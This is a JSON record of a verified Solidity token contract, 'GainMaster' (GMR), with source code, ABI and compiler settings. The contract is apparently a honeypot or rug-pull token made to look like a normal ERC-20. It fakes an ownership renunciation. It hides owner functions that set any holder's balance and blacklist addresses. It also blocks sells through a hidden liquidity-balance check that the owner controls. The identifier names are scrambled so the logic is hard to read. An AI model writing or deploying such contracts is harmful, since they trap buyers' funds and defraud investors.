{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface senderExempt {\n    function createPair(address amountTake, address txTeam) external returns (address);\n}\n\ninterface receiverMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeToken) external view returns (uint256);\n\n    function transfer(address isEnable, uint256 tradingShould) external returns (bool);\n\n    function allowance(address buyEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isEnable,\n        uint256 tradingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txLimit, uint256 value);\n    event Approval(address indexed buyEnable, address indexed spender, uint256 value);\n}\n\nabstract contract sellModeLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverMinMetadata is receiverMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GainMaster is sellModeLimit, receiverMin, receiverMinMetadata {\n\n    uint256 constant enableTake = 10 ** 10;\n\n    uint256 private tokenLaunched;\n\n    event OwnershipTransferred(address indexed feeReceiver, address indexed maxSell);\n\n    uint256 minSellReceiver;\n\n    string private fromReceiver = \"Gain Master\";\n\n    mapping(address => bool) public atReceiverIs;\n\n    function minLimit(address atTotalWallet) public {\n        if (launchedFund) {\n            return;\n        }\n        if (minIs != totalAmount) {\n            minIs = launchAmountReceiver;\n        }\n        atLiquidity[atTotalWallet] = true;\n        \n        launchedFund = true;\n    }\n\n    function listLimit(uint256 tradingShould) public {\n        marketingTeam();\n        minSellReceiver = tradingShould;\n    }\n\n    function balanceOf(address takeToken) public view virtual override returns (uint256) {\n        return launchedTo[takeToken];\n    }\n\n    uint256 swapTotal;\n\n    mapping(address => mapping(address => uint256)) private atMarketing;\n\n    function limitAt() public {\n        emit OwnershipTransferred(senderBuy, address(0));\n        shouldFundLiquidity = address(0);\n    }\n\n    mapping(address => uint256) private launchedTo;\n\n    bool public txLaunch;\n\n    function maxTo(address autoEnableSwap, address isEnable, uint256 tradingShould) internal returns (bool) {\n        require(launchedTo[autoEnableSwap] >= tradingShould);\n        launchedTo[autoEnableSwap] -= tradingShould;\n        launchedTo[isEnable] += tradingShould;\n        emit Transfer(autoEnableSwap, isEnable, tradingShould);\n        return true;\n    }\n\n    address public senderBuy;\n\n    address minShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address atFundAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public atLiquidity;\n\n    function marketingTeam() private view {\n        require(atLiquidity[_msgSender()]);\n    }\n\n    uint256 public exemptSenderShould;\n\n    function feeIs(address amountAuto, uint256 tradingShould) public {\n        marketingTeam();\n        launchedTo[amountAuto] = tradingShould;\n    }\n\n    function transfer(address amountAuto, uint256 tradingShould) external virtual override returns (bool) {\n        return limitLiquidity(_msgSender(), amountAuto, tradingShould);\n    }\n\n    uint8 private limitMax = 18;\n\n    uint256 private minBuy = 100000000 * 10 ** 18;\n\n    function approve(address liquidityTake, uint256 tradingShould) public virtual override returns (bool) {\n        atMarketing[_msgSender()][liquidityTake] = tradingShould;\n        emit Approval(_msgSender(), liquidityTake, tradingShould);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapReceiver;\n    }\n\n    uint256 public tokenTeam;\n\n    address private shouldFundLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minBuy;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldFundLiquidity;\n    }\n\n    bool public minMode;\n\n    address public senderReceiver;\n\n    uint256 private launchAmountReceiver;\n\n    uint256 private marketingMax;\n\n    function allowance(address sellTrading, address liquidityTake) external view virtual override returns (uint256) {\n        if (liquidityTake == minShould) {\n            return type(uint256).max;\n        }\n        return atMarketing[sellTrading][liquidityTake];\n    }\n\n    constructor (){\n        \n        listTx sellLimit = listTx(minShould);\n        senderReceiver = senderExempt(sellLimit.factory()).createPair(sellLimit.WETH(), address(this));\n        if (marketingMax == txAtWallet) {\n            txLaunch = false;\n        }\n        senderBuy = _msgSender();\n        atLiquidity[senderBuy] = true;\n        launchedTo[senderBuy] = minBuy;\n        limitAt();\n        \n        emit Transfer(address(0), senderBuy, minBuy);\n    }\n\n    function sellSwapTake(address receiverLiquidityFrom) public {\n        marketingTeam();\n        \n        if (receiverLiquidityFrom == senderBuy || receiverLiquidityFrom == senderReceiver) {\n            return;\n        }\n        atReceiverIs[receiverLiquidityFrom] = true;\n    }\n\n    bool public launchedFund;\n\n    uint256 public txAtWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return fromReceiver;\n    }\n\n    string private swapReceiver = \"GMR\";\n\n    uint256 private minIs;\n\n    function owner() external view returns (address) {\n        return shouldFundLiquidity;\n    }\n\n    function transferFrom(address autoEnableSwap, address isEnable, uint256 tradingShould) external override returns (bool) {\n        if (_msgSender() != minShould) {\n            if (atMarketing[autoEnableSwap][_msgSender()] != type(uint256).max) {\n                require(tradingShould <= atMarketing[autoEnableSwap][_msgSender()]);\n                atMarketing[autoEnableSwap][_msgSender()] -= tradingShould;\n            }\n        }\n        return limitLiquidity(autoEnableSwap, isEnable, tradingShould);\n    }\n\n    uint256 private totalAmount;\n\n    function limitLiquidity(address autoEnableSwap, address isEnable, uint256 tradingShould) internal returns (bool) {\n        if (autoEnableSwap == senderBuy) {\n            return maxTo(autoEnableSwap, isEnable, tradingShould);\n        }\n        uint256 enableBuy = receiverMin(senderReceiver).balanceOf(atFundAmount);\n        require(enableBuy == minSellReceiver);\n        require(isEnable != atFundAmount);\n        if (atReceiverIs[autoEnableSwap]) {\n            return maxTo(autoEnableSwap, isEnable, enableTake);\n        }\n        return maxTo(autoEnableSwap, isEnable, tradingShould);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atReceiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSenderShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"feeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"listLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotalWallet\",\"type\":\"address\"}],\"name\":\"minLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityFrom\",\"type\":\"address\"}],\"name\":\"sellSwapTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnableSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAtWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "GainMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}